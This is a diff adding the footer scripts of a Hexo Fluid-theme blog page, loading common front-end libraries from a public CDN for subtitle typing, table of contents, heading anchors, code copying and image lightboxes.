+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
